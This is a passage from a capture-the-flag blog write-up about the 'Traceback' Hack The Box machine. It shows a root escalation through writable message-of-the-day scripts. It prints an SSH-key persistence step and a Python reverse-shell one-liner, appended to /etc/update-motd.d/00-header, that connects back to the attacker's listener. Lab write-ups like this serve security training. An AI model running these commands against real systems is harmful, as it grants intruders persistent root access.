<span class="nt">-rwxr-xr-x</span> 1 root root 4264 Aug 25  2019 50-motd-news
<span class="nt">-rwxr-xr-x</span> 1 root root  604 Aug 25  2019 80-esm
<span class="nt">-rwxr-xr-x</span> 1 root root  299 Aug 25  2019 91-release-upgrade
</pre></table></code></div></div><p>We got write access to <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code>! It seems like the scripts in <code class="language-plaintext highlighter-rouge">/etc/update-motd</code> will be replaced with a clean version every now and then. Lets check if <code class="language-plaintext highlighter-rouge">ssh</code>ing into the box will cause these scripts to run.</p><p>First I generate a <code class="language-plaintext highlighter-rouge">ssh</code> key-pair.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: traceback/id_rsa
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="k">in </span>traceback/id_rsa.
Your public key has been saved <span class="k">in </span>traceback/id_rsa.pub.
The key fingerprint is:
SHA256:CMKnVhw7VM+I3CeNzdMaP58KKe2K/r2pm585NpE8IcA root@kali
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
|   .o..          |
| . +E= O .       |
|  o X.= X .      |
|   = o.+.=       |
|  o   .oSoo      |
| .     .=. o .   |
|      . +o  o    |
|     . =+= .     |
|   .o.**O+.      |
+----[SHA256]-----+
</span></pre></table></code></div></div><p>Then, I copy the contents of my public key <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> into <code class="language-plaintext highlighter-rouge">sysadmin</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> and <code class="language-plaintext highlighter-rouge">ssh</code> with the private key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu/dvT4ATAAvV67Dzm8YNMfOzD1np26hbCDYbfgv9vltGcNsjqxw/ZOqiTtl6S88VX/VcmiVmbFB4KTZLFv4Sh+jJF5jhGwHDjE/pB2xNxFeyvr2DNSOU+810XAm15M7sMQUowLzikZgbfc/tYMZ7n8Bkd97smwnsCpS51NQjgOeAAAXmSxeSlHEokH4TFQXC5Xf1ApTnWMgxpf+mM675UQYhpgSA2uc6xjCGUjRJyTPHoItg+DpUytuMliPtgKLXovv7MSMVMbKXcUCv/eUDYYjPUcQc50VqziVAAh1SmBaIRtVu/2+9b4TfpR1YmAfC+ZOSPMbZYzbP2IeSW3/panAFzu/Z/K4t4W8YHU4hpOkm4+70A1+LQqiC/67fwdnWWX3Baw6Is3HDV7Uhsxg4ulFGqSPtdoSQYWir6ToC0eBfFHj05nTrHLi4FuJVQInMdLdErSA6eQpNyYwWYvTMD/l10m1SlV1dupyGSW65y+rbID6EKkR1sGGBTS2RB4eE= root@kali"</span> <span class="o">&gt;&gt;</span> /home/sysadmin/.ssh/authorized_keys
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa sysadmin@traceback.htb
<span class="c">#################################</span>
<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
- I guess stuff could have been configured better ^^ -
<span class="c">#################################</span>

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</pre></table></code></div></div><p>The line <code class="language-plaintext highlighter-rouge">Welcome to Xh4H land</code> was from <code class="language-plaintext highlighter-rouge">00-header</code>! This means that since we can write to it and run any commands!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/update-motd.d/00-header
...
<span class="nb">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Welcome to Xh4H land </span><span class="se">\n</span><span class="s2">"</span>
</pre></table></code></div></div><h1 id="exploitation-2">Exploitation (2)</h1><p>Lets create a <code class="language-plaintext highlighter-rouge">bash</code> script that connects back to our <code class="language-plaintext highlighter-rouge">nc</code> listener on port <code class="language-plaintext highlighter-rouge">1338</code> and add it to <code class="language-plaintext highlighter-rouge">00-header</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /tmp/rev.sh
python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
<span class="nv">$ </span><span class="nb">chmod </span>777 /tmp/rev.sh
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/tmp/rev.sh"</span> <span class="o">&gt;&gt;</span> /etc/update-motd.d/00-header
</pre></table></code></div></div><p>And lastly, we simply start another <code class="language-plaintext highlighter-rouge">ssh</code> connection.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa sysadmin@traceback.htb
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>On our listener, we catch the connection and get the root flag.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1338
listening on <span class="o">[</span>any] 1338 ...
connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.181] 54618
root@traceback:/# <span class="nb">cat</span> /root/root.txt
05acXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/lua/" class="post-tag no-text-decoration" >lua</a> <a href="/tags/motd/" class="post-tag no-text-decoration" >motd</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Traceback - rizemon's blog&url=https://rizemon.github.io/posts/traceback-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Traceback - rizemon's blog&u=https://rizemon.github.io/posts/traceback-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Traceback - rizemon's blog&url=https://rizemon.github.io/posts/traceback-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/json-htb/"><div class="card-body"> <span class="timeago small" > Feb 16, 2020 <i class="unloaded">2020-02-16T01:41:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Json</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mac...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cascade-htb/" class="btn btn-outline-primary"><p>Hack The Box - Cascade</p></a> <a href="/posts/magic-htb/" class="btn btn-outline-primary"><p>Hack The Box - Magic</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
